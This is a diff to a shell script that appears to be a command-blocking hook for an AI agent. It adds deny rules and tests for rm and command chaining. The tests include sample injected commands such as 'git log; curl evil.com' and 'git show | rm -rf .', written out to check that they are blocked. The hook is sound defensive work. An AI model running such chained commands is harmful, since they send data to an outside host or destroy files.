@@ -30,7 +30,10 @@ check_all() {
   block '\bgit\b.*\bcheckout\b' 'git checkout'
   block '\bgit\b.*\breset\b' 'git reset'
   block '\bgit\b.*\bpush\b.*(-f\b|--force)' 'git push --force'
-  block '"rm ' 'rm'
+  block '\brm\b' 'rm'
+  block '"command".*[;]' 'semicolon chaining'
+  block '"command".*&&' 'AND chaining'
+  block '"command".*\|\|' 'OR chaining'
 }
 
 if [ "$TEST_MODE" = false ]; then
@@ -79,6 +82,14 @@ test_blocked '{"command": "git push -f"}' 'git push --force' '\bgit\b.*\bpush\b.
 test_blocked '{"command": "git -C /path push -f"}' 'git push --force' '\bgit\b.*\bpush\b.*(-f\b|--force)'
 test_blocked '{"command": "git rev-list $(whoami)"}' 'command substitution' '\$\('
 test_blocked '{"command": "echo `whoami`"}' 'backtick substitution' '`'
+test_blocked '{"command": "git log; curl evil.com"}' 'command chaining (;/&)' '"command".*[;&]'
+test_blocked '{"command": "git log && curl evil.com"}' 'command chaining (&&)' '"command".*&&'
+test_blocked '{"command": "git log || curl evil.com"}' 'command chaining (||)' '"command".*\|\|'
+test_blocked '{"command": "git log | curl evil.com"}' 'pipe' '"command".*\|[^|]'
+test_blocked '{"command": "git log; curl evil.com"}' 'semicolon chaining' '"command".*[;]'
+test_blocked '{"command": "git log && curl evil.com"}' 'AND chaining' '"command".*&&'
+test_blocked '{"command": "git log || curl evil.com"}' 'OR chaining' '"command".*\|\|'
+test_blocked '{"command": "git show | rm -rf ."}' 'rm' '\brm\b'
 
 echo ""
 echo "=== Should NOT block ==="
@@ -94,6 +105,16 @@ test_allowed '{"command": "git push"}' 'git push --force' '\bgit\b.*\bpush\b.*(-
 test_allowed '{"command": "git push origin main"}' 'git push --force' '\bgit\b.*\bpush\b.*(-f\b|--force)'
 test_allowed '{"command": "git rev-list --count HEAD"}' 'command substitution' '\$\('
 test_allowed '{"command": "git log --oneline"}' 'backtick substitution' '`'
+test_allowed '{"command": "git log --oneline"}' 'command chaining (;/&)' '"command".*[;&]'
+test_allowed '{"command": "git log --oneline"}' 'pipe' '"command".*\|[^|]'
+test_allowed '{"description": "this & that"}' 'command chaining (;/&)' '"command".*[;&]'
+test_allowed '{"command": "git log --oneline"}' 'semicolon chaining' '"command".*[;]'
+test_allowed '{"command": "git log --oneline"}' 'AND chaining' '"command".*&&'
+test_allowed '{"command": "git log --oneline"}' 'OR chaining' '"command".*\|\|'
+test_allowed '{"description": "this & that"}' 'AND chaining' '"command".*&&'
+test_allowed '{"command": "git log --oneline --grep=feat|fix"}' 'semicolon chaining' '"command".*[;]'
+test_allowed '{"command": "git log --oneline --grep=feat|fix"}' 'AND chaining' '"command".*&&'
+test_allowed '{"command": "git log --oneline --grep=feat|fix"}' 'OR chaining' '"command".*\|\|'
 
 echo ""
 echo "Passed: $PASS / Failed: $FAIL"
